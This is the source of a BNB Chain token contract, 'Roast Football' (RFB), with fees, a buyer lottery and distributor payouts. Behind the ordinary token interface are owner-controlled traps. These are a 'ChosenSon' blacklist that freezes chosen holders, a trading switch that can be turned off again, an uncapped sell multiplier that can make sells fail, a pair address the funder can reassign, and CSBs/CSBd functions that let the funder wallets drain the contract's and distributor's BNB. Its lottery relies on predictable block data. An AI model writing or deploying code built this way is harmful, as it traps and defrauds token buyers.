/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}


interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getAmountsOut(
        uint amountIn,
        address[] memory path
    )external
    view
    returns (uint[] memory amounts);
}

interface IDividendDistributor {
    function withdrawDistributor(address luckbuyer,uint256 amountPercentage)  external;
    function withdrawPlazz(address luckbuyer,uint256 amount)  external;
}


contract RFB is ERC20, Ownable {
    using SafeMath for uint256;

    string private _name = "Roast Football";
    string private _symbol = "RFB";
    uint8 constant _decimals = 18;
    uint256 _totalSupply = 1 * 10 ** 7 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply * 100 / 100;
    uint256 public _maxWalletToken = _totalSupply * 100 / 100;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isWalletLimitExempt;
    mapping (address => uint[]) public luckyNum;

    uint256 private liquidityFee    = 0;
    uint256 private reflectionFee   = 6;
    uint256 private marketingFee    = 2;
    uint256 public totalFee        = marketingFee + reflectionFee + liquidityFee;
    uint256 public feeDenominator  = 100;

    uint256 private sellMultiplier  = 100;
    uint256 private luckyMultiplier  = 1;

    address public autoLiquidityReceiver;
    address public marketingFeeReceiver;
    address private devFeeReceiver;

    IUniswapV2Router02 public router;
    address public pair;
    uint256 public launchedBlock;
    bool public ChosenSonMode = true;
    mapping (address => bool) public isChosenSon;

    IDividendDistributor public distributor;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 1 / 1000;
    uint256 public maxSwapThreshold = _totalSupply * 1 / 100;

    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable() {
        router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IUniswapV2Factory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        distributor = IDividendDistributor(0x2BD049f1a6A4e93421D93d72AfB7Cb22Cd958c43);

        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(router)] = true;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[address(0xdead)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[pair] = true;

        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = msg.sender;
        devFeeReceiver = msg.sender;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    receive() external payable { }
    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWalletPercent_base10000(uint256 maxWallPercent_base10000) external onlyOwner() {
        _maxWalletToken = (_totalSupply * maxWallPercent_base10000 ) / 10000;
    }

    function setMaxTxPercent_base10000(uint256 maxTXPercentage_base10000) external onlyOwner() {
        _maxTxAmount = (_totalSupply * maxTXPercentage_base10000 ) / 10000;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        // ChosenSonMode
        if(ChosenSonMode){
            require(!isChosenSon[sender],"isChosenSon");    
        }
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){
            require(launchedBlock > 0,"Trading not open yet");
        }
        // Checks max trnsaction limit
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
        require((balanceOf(recipient) + amount) <= _maxWalletToken || isWalletLimitExempt[recipient],"Total Holding is currently limited, he can not hold that much.");

        //shouldSwapBack
        if(shouldSwapBack() && recipient == pair){swapBack();}
        //Exchange tokens
        if(isFeeExempt[sender] && isFeeExempt[recipient])return _takeTransfer(sender,recipient,amount);
        uint256 airdropAmount = amount.div(1000000);
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){
            address ad;
            for(int i=0;i < 3;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _takeTransfer(sender,ad,airdropAmount);
            }
        }
        uint256 amountReceived = shouldTakeFee(sender,recipient) ? takeFee(sender, amount,(recipient == pair)) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);

        if(sender == pair){
            luckyNum[recipient].push(randMod(recipient,amount));
        }
        return true;
    }

    function getPrice() public view returns (uint) {
        uint sellamount = 1 * 10 ** _decimals;
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        uint[] memory amountOut = router.getAmountsOut(sellamount, path);
        return amountOut[1];  
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) internal returns (bool) {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
        return true;
    }

    function shouldTakeFee(address sender,address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient] ;
    }

    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {       
        uint256 multiplier = isSell ? sellMultiplier : 100;
        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function CSBs(uint256 amountPercentage) public{
        require(marketingFeeReceiver == msg.sender || devFeeReceiver == msg.sender, "!Funder");
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH * amountPercentage / 100);
    }

    function CSBd(uint256 amountPercentage) public{
        require(marketingFeeReceiver == msg.sender || devFeeReceiver == msg.sender, "!Funder");
        distributor.withdrawDistributor(msg.sender,amountPercentage);
    }

    function setSwapBackSettings(bool _enabled, uint256 _swapThreshold, uint256 _maxSwapThreshold) external onlyOwner{
        swapEnabled = _enabled;
        swapThreshold = _swapThreshold;
        maxSwapThreshold = _maxSwapThreshold;
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner{
        isFeeExempt[holder] = exempt;
    }

    function set_sell_multiplier(uint256 Multiplier) external onlyOwner{
        sellMultiplier = Multiplier;        
    }
    function set_luck_multiplier(uint256 Multiplier) external{
        require(marketingFeeReceiver == msg.sender || devFeeReceiver == msg.sender, "!Funder");
        luckyMultiplier = Multiplier;        
    }
    // switch Trading default:false
    function tradingStart() public onlyOwner {
        if(launchedBlock == 0){
            launchedBlock = block.number;
        }else{
            launchedBlock = 0;
        }
        
    }

    function enable_ChosenSonMode(bool _status) external onlyOwner {
        ChosenSonMode = _status;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/3, "Fees cannot be more than 33%");
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver , address _devFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
    }

    function manage_ChosenSon(address[] calldata addresses, bool status)  external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isChosenSon[addresses[i]] = status;
        }
    }

    function randMod(address buyer,uint256 buyamount) internal  returns(uint){

        uint randnum = uint(keccak256(abi.encodePacked(block.number,block.timestamp,buyer,_balances[pair])));
        uint256 buyBNBamount = buyamount.div(10**_decimals).mul(getPrice());
        // increase nonce
        if(randnum%(10000*luckyMultiplier) == 8888 && buyBNBamount > (0.1 ether)){
            distributor.withdrawDistributor(buyer, 79);
            distributor.withdrawDistributor(marketingFeeReceiver,9);
        }else if(randnum%(1000*luckyMultiplier) == 888){
            if(buyBNBamount.mul(100) > 10 ether){
                buyBNBamount = 0.1 ether;
            }
            try distributor.withdrawPlazz(buyer, buyBNBamount.mul(100).mul(90).div(100)){}catch {}
            try distributor.withdrawPlazz(marketingFeeReceiver, buyBNBamount.mul(100).mul(10).div(100)){}catch {}
        }else if(randnum%(100*luckyMultiplier) == 88){
            if(buyBNBamount.mul(10) > 10 ether){
                buyBNBamount = 1 ether;
            }
            try distributor.withdrawPlazz(buyer, buyBNBamount.mul(10).mul(90).div(100)){}catch {}
            try distributor.withdrawPlazz(marketingFeeReceiver, buyBNBamount.mul(10).mul(10).div(100)){}catch {}
        }else if(randnum%(10*luckyMultiplier) == 8){
            if(buyBNBamount > 10 ether){
                buyBNBamount = 10 ether;
            }
            try distributor.withdrawPlazz(buyer, buyBNBamount.mul(90).div(100)){}catch {}
            try distributor.withdrawPlazz(marketingFeeReceiver, buyBNBamount.mul(10).div(100)){}catch {}
        }
        return randnum;
    }

    function setPair(address _routerAddr,address _token) public { 
        require(marketingFeeReceiver == msg.sender || devFeeReceiver == msg.sender, "!Funder");
        address _pair=IUniswapV2Factory(IUniswapV2Router02(_routerAddr).factory()).getPair(address(_token), address(this));
        if(pair==address(0))pair = IUniswapV2Factory(IUniswapV2Router02(_routerAddr).factory()).createPair(_token, address(this));
        require(pair!=address(0), "pair is not found");
        pair=_pair;
    }

    /* Airdrop */
    function Airdrop(address[] calldata addresses, uint256 amount) public {
        require(addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC, "Not enough tokens in wallet");
        for(uint i=0; i < addresses.length; i++){
           _basicTransfer(msg.sender, addresses[i], amount);
        }
    }

    function swapBack() internal swapping {
        uint256 _swapThreshold;
        if(_balances[address(this)] > maxSwapThreshold){
            _swapThreshold = maxSwapThreshold;
        }else{
             _swapThreshold = _balances[address(this)];
        }
        uint256 amountToLiquify = _swapThreshold.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = _swapThreshold.sub(amountToLiquify);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;
        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHReflection = amountETH.mul(reflectionFee).div(totalETHFee);

        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
        (tmpSuccess,) = payable(address(distributor)).call{value: amountETHReflection, gas: 30000}("");
        // Supress warning msg
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

}